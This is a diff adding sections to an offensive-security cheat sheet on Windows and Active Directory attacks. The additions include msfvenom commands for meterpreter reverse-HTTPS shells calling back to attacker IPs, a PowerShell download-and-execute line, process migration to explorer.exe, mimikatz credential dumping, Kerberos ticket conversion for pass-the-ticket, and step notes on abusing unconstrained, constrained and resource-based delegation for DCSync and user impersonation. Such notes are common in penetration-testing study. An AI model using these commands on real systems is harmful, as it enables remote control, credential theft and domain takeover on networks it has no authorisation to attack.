@@ -200,6 +200,9 @@ smbmap -u ceso -H 192.168.24.24
 ```
 
 ### Login through CIFS/WinRM/PSSession
+
+When injecting a ticket and impersonating a user, we can swap `CIFS` for `HTTP` for getting a shell via WinRM or swap `CIFS` for `HOST` for getting a shell via PsExec!!!
+
 #### CrackMapExec - WinRM
 
 With Hash
@@ -520,6 +523,22 @@ msfvenom -p java/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f war  rev_she
 
 ```console
 msfvenom -a x86 --platform windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://192.168.42.42/Invoke-PowerShellTcp.ps1')\"" -e x86/unicode_mixed BufferRegister=EAX -f python
+```
+
+```console
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.42.42 lport=443 -f csharp
+```
+
+We can also use it with the following parameters for migration
+
+```console
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.59 LPORT=443 EnableStageEncoding=True PrependMigrate=True -f csharp
+```
+
+Or either, in the `msfconsole` add the parameter `AutoRunScript`, the following will try to migrate our reverse too explorer.exe:
+
+```console
+set AutoRunScript post/windows/manage/migrate name=explorer.exe spawn=false
 ```
 
 ### Windows staged reverse TCP
@@ -1027,6 +1046,19 @@ Get-DomainSID -Domain example.com <-- Get the SID of example.com
 mimikatz.exe "sekurlsa::logonpasswords" exit
 ```
 
+#### Convert to ccache
+
+We can use the tool `ticket_converter` written by `zer1t0` for converting kirbi tickets to ccache and viceversa:
+
+```console
+Convert from b64 encoded blob to kirbi:
+  [IO.File]::WriteAllBytes("C:\fullpathtoticket.kirbi", [Convert]::FromBase64String("aa…"))
+Convert the .kiribi to .ccache:
+  python ticket_converter.py ticket.ccache ticket.kirbi
+Copy the ccache to our attacker machine and export the KRB5CCNAME variable:
+  export KRB5CCNAME=/path/to/ticket.ccache
+```
+
 #### GenericAll
 
 #### GenericWrite
@@ -1034,6 +1066,13 @@ mimikatz.exe "sekurlsa::logonpasswords" exit
 #### WriteDACL
 
 #### Unconstrained Delegation
+
+We have local adminstrative access to a host which is configured for Kerberos Unconstrained Delegation.
+We can leverage Rubeus for an auth from the DC and then steal the TGT, this can be used to perform a DCSync to obtain the NTLM hash for ANY account.
+Other way is by triggering the printer bug on a domain controller to coerce to authenticate to the host compromised we have using it's machine account.
+
+If a computer account has `TRUSTED_FOR_DELEGATION` in it's UserAccountControl (UAC), then it's a viable target.
+Domain controllers will also have `SERVER_TRUST_ACCOUNT_UAC`, so...if it the machine has this, then it's a DC.
 
 ##### By Forwardable TGT after login
 
@@ -1051,7 +1090,7 @@ mimikatz.exe "sekurlsa::logonpasswords" exit
 * By default every user allows their TGT to be delegated, but high privilege users can be added to the group "Protected Users Group" to disable it, it also can break the application for which at the beggining unconstrained delegation was enabled for those users
 ```
 
-##### By using of SpoolSample.exe
+##### By using of SpoolSample.exe (printer bug)
 
 ```console
 1 - Download and compile SpoolSample in a dev machine, it can be downloaded from: https://github.com/leechristensen/SpoolSample
@@ -1069,4 +1108,20 @@ mimikatz.exe "sekurlsa::logonpasswords" exit
 
 #### Constrained Delegation
 
+We have compromised a computer/user account configured for Constrained Delegation (ie, the account's UserAccountControl attribute contains the value `TRUSTED_TO_AUTH_FOR_DELEGATION`). If it is, it's A MUST to look also after `msDS-AllowedToDelegateTo` account's property, this will have one or more hostnames/SPNs where our account will be allowed to impersonate any (non-sensitive/unproctected) user in the domain.
+
+We have 2 scenarios where we can have Constrained Delegation:
+
+* 1 - We have command execution in the account in question, but not know the password for it
+* 2 - We know the NTLM hash, or at least can get the hash from the NTLM hash
+
 #### Resource-Based Constrained Delegation (RBCD)
+
+Only found if we are working on an envrionment which is running domain controllers with Windows Server 2012 or higher.
+This one is complex than the Unconstrained/Constrained.
+
+The scenarios where we can leverage this are:
+
+* 1 - Computer/User account compromised listed in another computer account's msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Used to leverage ANY user account on the host which has the property
+* 2 - Computer/User account which has GenericWrite to another computer account in the domain, can be leveraged to add the account compromised to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target and afterwards impersonate ANY user account.
+* 3 - We don't have credentials, but we can get to relay a hash with responder/impacket-ntlmrelayx/mitm6 to LDAP and create a new computer account and add it to the msDS-AllowedToActOnBehalfOfOtherIdentity property. Later on impersonate any user.
